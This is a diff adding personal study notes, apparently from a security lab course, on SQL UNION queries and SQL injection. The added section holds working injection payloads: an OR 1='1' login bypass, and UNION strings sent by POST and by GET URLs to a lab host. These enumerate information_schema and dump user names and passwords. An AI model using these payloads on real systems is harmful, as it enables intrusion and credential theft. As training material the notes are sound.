@@ -424,6 +424,71 @@ SELECT tireid,name,size,cost FROM session.Tires (output is put into the order se
 ***************SELECT column,column,column FROM Database.Table;***************
 SELECT color,year,name FROM session.car UNION SELECT name,size,cost FROM session.Tires (puts the information from both tables and adds them into the same table)
 UNION must have the same amount of columns selected in order for the commands to work
+Can use any number to populate empty columns that are needed to properly run the command
+
+SQL Injection
+----
+Requires Valid SQL Queries
+Fully patched systems can be vulnerable due to misconfiguration
+Input Field Sanitization
+String vs Integer Values
+Is INFORMATION_SCHEMA Database available?
+GET Request versus POST Request HTTP methods (Results may vary when using GET compared to POST)
+
+INFORMATION_SCHEMA has information about all of the databases
+
+Unsanitized vs sanitized
+----
+Unsanitized is not checked for potentially harmful information
+Sanitized is checked
+
+
+
+##################################################################################
+##################################################################################
+#####                                                                        #####
+#####          Finding Usernames and Passwords using SQL Injection           #####
+#####                                                                        #####
+##################################################################################
+##################################################################################
+
+
+select id from users where name = '$name' and pass = '$pass'
+select id from users where name = 'tom' or 1='1' and pass = 'tom' or 1='1';
+when the server doesnt know how to handle the information that it was given when it was not supposed to work it dumps all of the IDs on the system
+
+POST Method
+----
+Audi' UNION 1,2,3,4,5 ;#
+Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns ;# (decide placeholders based on output of the original correct POST request command)
+table_schema = databases
+table_name = tables
+column_name = columns
+
+Audi' UNION select id,2,name,pass,5 from session.user ;#
+
+GET Method
+----
+http://10.50.35.75/uniondemo.php?Selection=2 or 1=1#
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,2#
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns#
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select id,pass,name from session.user#
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select cost,year,color from session.car UNION select type,carid,name from session.car#
+
+
+
+##################################################################################
+##################################################################################
+#####                                                                        #####
+#####          Finding Usernames and Passwords using SQL Injection           #####
+#####                                                                        #####
+##################################################################################
+##################################################################################
+
+
+
+
+
 
 
 
